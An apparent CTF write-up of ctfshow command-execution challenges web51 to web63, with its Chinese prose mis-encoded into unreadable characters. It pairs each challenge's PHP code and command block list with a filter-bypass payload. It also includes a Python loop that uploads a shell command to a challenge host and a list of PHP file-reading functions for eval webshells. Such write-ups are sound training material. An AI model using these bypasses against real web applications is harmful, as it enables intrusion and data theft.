<p>è¿™æ¬¡æŠŠ<code>%</code>è¿›è¡Œäº†è¿‡æ»¤ï¼Œæˆ‘ä»¬ä½¿ç”¨&lt;&gt;å·è¿›è¡Œç»•è¿‡ï¼Œè¿™é‡Œé€šé…ç¬¦è¿›è¡Œä¿®æ”¹ä¸€ä¸‹ï¼Œ&lt;&gt;å’Œï¼Ÿä¸€èµ·æ²¡æœ‰æ˜¾ç¤ºå‡ºæ¥ï¼Œæ”¹ç”¨<code>\</code>è¿›è¡Œç»•è¿‡ï¼Œpaylaodå¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;tac&lt;&gt;fla\g.php||</span><br></pre></td></tr></table></figure>
<h3 id="web51"><a class="header-anchor" href="#web51">Â¶</a>web51</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ¬¡å¯¹tacè¿›è¡Œäº†è¿‡æ»¤ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨<code>\</code>åˆ†å‰²è¿›è¡Œç»•è¿‡ï¼Œpayloadå¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;ta\c&lt;&gt;fla\g.php||</span><br></pre></td></tr></table></figure>
<h3 id="web52"><a class="header-anchor" href="#web52">Â¶</a>web52</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ¬¡è¿‡æ»¤äº†å°–æ‹¬å·ï¼Œä½†æ”¾ç©ºäº†<code>$</code>ç¬¦ç»™æˆ‘ä»¬ï¼Œæ‰€ä»¥payloadå¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;ta\c$&#123;IFS&#125;fla\g.php||</span><br></pre></td></tr></table></figure>
<p>ä½†emmmï¼Œå¥½åƒflagæ”¹åœ°æ–¹äº†<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web52/NREZX%5B2B1Q8ODJ%6060%28O_OSO.png" alt=""><br>
ç”¨lsæ‰¾ä¸€ä¸‹ï¼Œå‘ç°åœ¨æ ¹ç›®å½•<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web52/%5DGLTIXCV%7BG9W9%5D8%28C90%60L4E.png" alt=""><br>
æ‰€ä»¥çœŸæ­£payloadå¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;ta\c$&#123;IFS&#125;..&#x2F;..&#x2F;..&#x2F;fla?||</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web52/%60PF%7B%24%24EPXTDI%255AV%40H%5BKA6F.png" alt=""></p>
<h3 id="web53"><a class="header-anchor" href="#web53">Â¶</a>web53</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">echo</span>($c);</span><br><span class="line">        $d = system($c);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.$d;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ¬¡å¥½åƒåªæŠŠåé¢çš„åå›æ˜¾ç»™å»æ‰äº†ï¼Œé‚£æˆ‘ä»¬å»æ‰åé¢çš„<code>||</code>å³å¯ï¼Œpayloadå¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;ta\c$&#123;IFS&#125;fla?.php</span><br></pre></td></tr></table></figure>
<h3 id="web54"><a class="header-anchor" href="#web54">Â¶</a>web54</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ¬¡è¿‡æ»¤äº†å¥½å¤šå­—æ¯ï¼Œä¹Ÿä¸èƒ½ä¼šç”¨<code>\</code>çš„å½¢å¼è¿›è¡Œåˆ†å‰²ï¼Œä½†è¿˜æœ‰å¦ä¸€ä¸ªè¯»å–çš„å‘½ä»¤grepå¯ä»¥ä½¿ç”¨</p>
<blockquote>
<p>grep flag flag.php  æŸ¥æ‰¾flag.phpæ–‡ä»¶ä¸­å«æœ‰flagçš„é‚£ä¸€è¡Œï¼Œå¹¶ä¸”æ‰“å°å‡ºæ¥</p>
</blockquote>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ payloadå¦‚ä¸‹ï¼Œåœ¨flag.phpä¸­æŸ¥æ‰¾å¸¦æœ‰showå­—ç¬¦ä¸²çš„ä¸€è¡Œ(å› ä¸ºflagçš„æ ¼å¼ä¸ºctfshow{})</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;grep$&#123;IFS&#125;show$&#123;IFS&#125;fl?g.php</span><br></pre></td></tr></table></figure>
<h3 id="web55"><a class="header-anchor" href="#web55">Â¶</a>web55</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ¬¡æŠŠå­—æ¯éƒ½ç»™ç¦æ‰äº†ï¼Œä¸€èˆ¬é‡åˆ°è¿™æƒ…å†µæœ€å®¹æ˜“æƒ³åˆ°çš„åº”è¯¥æ˜¯è¿›è¡Œå¼‚æˆ–è¿ç®—ç­‰ç­‰åŠæ³•è¿›è¡Œæ„é€ ï¼Œåœ¨è¿™é‡Œä»–æ²¡æœ‰ç¦æ‰æ•°å­—ï¼Œæˆ‘ä»¬æœ‰å…¶ä»–ç•¥å¾®æ–¹ä¾¿ç‚¹çš„æ–¹æ³•ï¼Œå°±æ˜¯é€šè¿‡åŒ¹é…binä¸‹å­˜åœ¨çš„å‘½ä»¤è¿›è¡Œè¯»å–flag</p>
<blockquote>
<p>binä¸ºbinaryçš„ç®€å†™ï¼Œä¸»è¦æ”¾ç½®ä¸€äº›ç³»ç»Ÿçš„å¿…å¤‡æ‰§è¡Œæ¡£ä¾‹å¦‚:catã€cpã€chmod dfã€dmesgã€gzipã€killã€lsã€mkdirã€moreã€mountã€rmã€suã€tarã€base64ç­‰ã€‚<br>
æˆ‘ä»¬æ—¥å¸¸ç›´æ¥ä½¿ç”¨çš„catæˆ–è€…lsç­‰ç­‰éƒ½å…¶å®æ˜¯ç®€å†™ï¼Œä¾‹å¦‚lså®Œæ•´å…¨ç§°åº”è¯¥æ˜¯/bin/ls</p>
</blockquote>
<p>è¿™é‡Œæ²¡æœ‰ç¦ç”¨æ•°å­—æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨base64å‘½ä»¤ï¼Œæ„é€ å¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;&#x2F;???&#x2F;????64 ????.???                     ä¹Ÿå°±æ˜¯?c&#x3D;&#x2F;bin&#x2F;base64 flag.php</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web55/2L8OFD%28V3OTMN%7D~I6%29H%24NA9.png" alt=""><br>
å†è¿›è¡Œè§£ç å³å¯å¾—åˆ°flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web55/PQE%7BW3WHX3_%40_%24ONV%7D7C%4032.png" alt=""></p>
<h3 id="web56"><a class="header-anchor" href="#web56">Â¶</a>web56</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ¬¡åœ¨ä¸Šä¸€é¢˜çš„åŸºç¡€ä¸Šå¤šè¿‡æ»¤æ‰äº†æ•°å­—ï¼Œå¯¼è‡´æˆ‘ä»¬æ— æ³•ä½¿ç”¨ä¸Šé¢˜çš„payloadã€‚ä¸è¿‡ä¹‹å‰çœ‹è¿‡på¸ˆå‚…çš„ä¸€ç¯‡æ— å­—æ¯æ•°å­—webshellçš„æ–‡ç« ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨phpçš„ç‰¹æ€§ï¼šå¦‚æœæˆ‘ä»¬å‘é€ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„poståŒ…ï¼Œphpä¼šå°†æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ä¿å­˜åœ¨ä¸´æ—¶çš„æ–‡ä»¶å¤¹ä¸‹ï¼Œå¹¶ä¸”é»˜è®¤çš„æ–‡ä»¶ç›®å½•æ˜¯/tmp/phpxxxxxxã€‚æ–‡ä»¶åæœ€åçš„6ä¸ªå­—ç¬¦æ˜¯éšæœºçš„å¤§å°å†™å­—æ¯ï¼Œè€Œä¸”æœ€åä¸€ä¸ªå­—ç¬¦å¤§æ¦‚ç‡æ˜¯å¤§å†™å­—æ¯ã€‚å®¹æ˜“æƒ³åˆ°çš„åŒ¹é…æ–¹å¼å°±æ˜¯åˆ©ç”¨<code>ï¼Ÿ</code>è¿›è¡ŒåŒ¹é…ï¼Œå³<code>???/?????????</code>ï¼Œç„¶è€Œè¿™ä¸ä¸€å®šä¼šåŒ¹é…åˆ°æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ï¼Œè¿™æ—¶å€™æœ‰ä»€ä¹ˆåŠæ³•å‘¢ï¼Ÿ<br>
åœ¨asciiç è¡¨ä¸­è§‚å¯Ÿå‘ç°<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web56/0IFRV0PPH991LC%25HL%6088%24US.png" alt=""><br>
åœ¨å¤§å†™å­—æ¯Açš„å‰ä¸€ä¸ªç¬¦å·ä¸º<code>@</code>ï¼Œå¤§å†™å­—æ¯Zçš„åä¸€ä¸ªå­—æ¯ä¸º<code>[</code>ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>[@-[]</code>æ¥è¡¨ç¤ºåŒ¹é…å¤§å†™å­—æ¯ï¼Œä¹Ÿå°±æ˜¯å˜æˆäº†è¿™æ ·çš„å½¢å¼ï¼š<code>???/????????[@-[]</code>ï¼Œåˆ°è¿™ä¸€æ­¥å·²ç»èƒ½åŒ¹é…åˆ°äº†æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ï¼Œé‚£é™åˆ¶äº†å­—æ¯åè¯¥å¦‚ä½•æ‰§è¡Œä¸Šä¼ çš„æ–‡ä»¶å‘¢ï¼Ÿè¿™é‡Œæœ‰ä¸ªæŠ€å·§ï¼Œå°±æ˜¯ä½¿ç”¨<code>. file</code>æ¥æ‰§è¡Œæ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥å»æ“ä½œçœ‹çœ‹<br>
åœ¨ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªf.txtï¼Œå†…å®¹ä¸ºlsï¼Œæˆ‘ä»¬ä½¿ç”¨<code>. /home/kali/ctf_tools/a/f.txt</code>æ¥æ‰§è¡Œæ–‡ä»¶<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web56/LKNQQ5IM_3AI%7B1LH%2420J42O.png" alt=""><br>
å‘ç°f.txté‡Œçš„lså‘½ä»¤è¢«æˆåŠŸæ‰§è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬çš„å®Œæ•´payloadå°±æ˜¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;. &#x2F;???&#x2F;????????[@-[]</span><br><span class="line">å¹¶ä¸”åŒæ—¶ä¸Šä¼ æˆ‘ä»¬çš„æ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹é‡Œé¢æ˜¯å‘½ä»¤</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæˆ‘ä»¬å†™ä¸ªè„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/11 9:14</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    url = <span class="string">&quot;http://92a3d8ba-280b-4cb8-bd47-58b577bb6204.chall.ctf.show:8080/?c=. /???/????????[@-[]&quot;</span></span><br><span class="line"></span><br><span class="line">    r = requests.post(url, files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&quot;dota.txt&quot;</span>, <span class="string">&quot;cat flag.php&quot;</span>)&#125;)</span><br><span class="line">    flag = r.text.split(<span class="string">&#x27;ctfshow&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> len(flag) &gt;<span class="number">1</span>:</span><br><span class="line">        print(r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>è¿è¡Œå®ŒåæˆåŠŸè·å–åˆ°flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web56/J36~B%25PUX3GF%7DVQASGO%5BDYX.png" alt=""></p>
<h3 id="web57"><a class="header-anchor" href="#web57">Â¶</a>web57</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, $c))&#123;</span><br><span class="line">        system(<span class="string">&quot;cat &quot;</span>.$c.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é¢˜ä¸ä»…è¿‡æ»¤äº†å­—æ¯æ•°å­—ï¼Œè¿˜æŠŠé€šé…ç¬¦éƒ½ç»™è¿‡æ»¤äº†ã€‚æŸ¥äº†ä¸€ä¸‹èµ„æ–™ï¼Œå‘ç°åœ¨shellä¸­å¯ä»¥åˆ©ç”¨<code>$</code>å’Œ<code>()</code>è¿›è¡Œæ„é€ æ•°å­—ï¼Œè€Œè¿™é“é¢˜æç¤ºflagåœ¨36.phpä¸­ï¼Œsystemä¸­å·²ç»å†™å¥½catå’Œphpï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æ„é€ å‡º36å³å¯</p>
<blockquote>
<p><code>$(())</code>                  									 ä»£è¡¨åšä¸€æ¬¡è¿ç®—ï¼Œå› ä¸ºé‡Œé¢ä¸ºç©ºï¼Œä¹Ÿè¡¨ç¤ºå€¼ä¸º0<br>
<code>$((~$(())))</code>         									å¯¹0ä½œå–åè¿ç®—ï¼Œå€¼ä¸º-1<br>
<code>$(($((~$(())))$((~$(())))))</code>                 -1-1ï¼Œä¹Ÿå°±æ˜¯(-1)+(-1)ä¸º-2ï¼Œæ‰€ä»¥å€¼ä¸º-2<br>
<code>$((~$(($((~$(())))$((~$(())))))))</code>       å†å¯¹-2åšä¸€æ¬¡å–åå¾—åˆ°1ï¼Œæ‰€ä»¥å€¼ä¸º1</p>
<p>å¦‚æœå¯¹å–åä¸äº†è§£å¯ä»¥ç™¾åº¦ä¸€ä¸‹ï¼Œè¿™é‡Œç»™ä¸ªå®¹æ˜“è®°å¾—å¼å­ï¼Œå¦‚æœå¯¹aæŒ‰ä½å–åï¼Œåˆ™å¾—åˆ°çš„ç»“æœä¸º-(a+1)ï¼Œä¹Ÿå°±æ˜¯å¯¹0å–åå¾—åˆ°-1</p>
</blockquote>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web57/CHH1%24IQ%40EBHL5L%2877%5B%40%251OP.png" alt=""><br>
æ‰€ä»¥æˆ‘ä»¬åªè¦æ„é€ å‡º-37ï¼Œå†è¿›è¡Œå–åï¼Œå³å¯å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„æ•°å­—36<br>
å†™ä¸€ä¸ªè„šæœ¬è¿›è¡Œæ„é€ </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = <span class="string">&quot;$((~$((&quot;</span>+<span class="string">&quot;$((~$(())))&quot;</span>*<span class="number">37</span>+<span class="string">&quot;))))&quot;</span></span><br><span class="line">print(data)</span><br></pre></td></tr></table></figure>
<p>payloadå¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web57/%5BYB%29%7D%5BYR3LS3%60MH~%60XVE0P4.png" alt=""><br>
å› ä¸ºæ˜¯catå‘½ä»¤ï¼Œæ‰€ä»¥å³é”®æŸ¥çœ‹ä¸€ä¸‹æºç å³å¯å¾—åˆ°flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web57/%7DYV1%40J%28Y9HCI3OUEMBT0%5B17.png" alt=""></p>
<h3 id="web58"><a class="header-anchor" href="#web58">Â¶</a>web58</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é¢ï¼Œçªç„¶å˜ç®€å•äº†ï¼Œè¿™é‡Œå¯ä»¥ç›´æ¥èšå‰‘è¿æ¥è¿›å»æŸ¥çœ‹flagäº†(åé¢å…¶å®éƒ½å¯ä»¥ä½¿ç”¨èšå‰‘ç›´æ¥è¿æ¥getshell)<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web58/B4A4VP%5BNJ%40B61F6R%407Z%604RY.png" alt=""><br>
ä¸è¿‡åº”è¯¥æ˜¯è€ƒè¯»å–æ–‡ä»¶çš„ï¼Œæˆ‘ä»¬ä½¿ç”¨è¯»å–æ–‡ä»¶å‡½æ•°è¿›è¡Œè¯»å–flagï¼Œpayloadå¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;show_source(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web58/W%25%29%7B%5BN%60~%40APWG58M5%603I6_2.png" alt=""><br>
è¿™é‡Œè¡¥å……ä¸€äº›è¯»å–æ–‡ä»¶å‡½æ•°çš„ç”¨æ³•</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">highlight_file($filename);</span><br><span class="line">show_source($filename);</span><br><span class="line">print_r(php_strip_whitespace($filename));</span><br><span class="line">print_r(file_get_contents($filename));</span><br><span class="line">readfile($filename);</span><br><span class="line">print_r(file($filename)); <span class="comment">// var_dump</span></span><br><span class="line">fread(fopen($filename,<span class="string">&quot;r&quot;</span>), $size);</span><br><span class="line"><span class="keyword">include</span>($filename); <span class="comment">// éphpä»£ç </span></span><br><span class="line"><span class="keyword">include_once</span>($filename); <span class="comment">// éphpä»£ç </span></span><br><span class="line"><span class="keyword">require</span>($filename); <span class="comment">// éphpä»£ç </span></span><br><span class="line"><span class="keyword">require_once</span>($filename); <span class="comment">// éphpä»£ç </span></span><br><span class="line">print_r(fread(popen(<span class="string">&quot;cat flag&quot;</span>, <span class="string">&quot;r&quot;</span>), $size));</span><br><span class="line">print_r(fgets(fopen($filename, <span class="string">&quot;r&quot;</span>))); <span class="comment">// è¯»å–ä¸€è¡Œ</span></span><br><span class="line">fpassthru(fopen($filename, <span class="string">&quot;r&quot;</span>)); <span class="comment">// ä»å½“å‰ä½ç½®ä¸€ç›´è¯»å–åˆ° EOF</span></span><br><span class="line">print_r(fgetcsv(fopen($filename,<span class="string">&quot;r&quot;</span>), $size));</span><br><span class="line">print_r(fgetss(fopen($filename, <span class="string">&quot;r&quot;</span>))); <span class="comment">// ä»æ–‡ä»¶æŒ‡é’ˆä¸­è¯»å–ä¸€è¡Œå¹¶è¿‡æ»¤æ‰ HTML æ ‡è®°</span></span><br><span class="line">print_r(fscanf(fopen(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;r&quot;</span>),<span class="string">&quot;%s&quot;</span>));</span><br><span class="line">print_r(parse_ini_file($filename)); <span class="comment">// å¤±è´¥æ—¶è¿”å› false , æˆåŠŸè¿”å›é…ç½®æ•°ç»„</span></span><br></pre></td></tr></table></figure>
<h3 id="web59"><a class="header-anchor" href="#web59">Â¶</a>web59</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä»£ç æ²¡å˜ï¼Œåº”è¯¥æ˜¯å¼€å§‹ç¦ç”¨äº†ä¸€äº›å‡½æ•°ï¼Œè€ƒç‚¹åº”è¯¥å¼€å§‹æ˜¯ç»•disable_functionsäº†ï¼Œshow_source()æ²¡æœ‰è¢«ç¦ï¼Œç»§ç»­ä½¿ç”¨</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;show_source(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure>
<h3 id="web60"><a class="header-anchor" href="#web60">Â¶</a>web60</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>show_source()æ²¡æœ‰è¢«ç¦ï¼Œç»§ç»­ä½¿ç”¨</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;show_source(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure>
<h3 id="web61"><a class="header-anchor" href="#web61">Â¶</a>web61</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>show_source()æ²¡æœ‰è¢«ç¦ï¼Œç»§ç»­ä½¿ç”¨</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;show_source(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure>
<h3 id="web62"><a class="header-anchor" href="#web62">Â¶</a>web62</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>show_source()æ²¡æœ‰è¢«ç¦ï¼Œç»§ç»­ä½¿ç”¨</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;show_source(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure>
<h3 id="web63"><a class="header-anchor" href="#web63">Â¶</a>web63</h3>
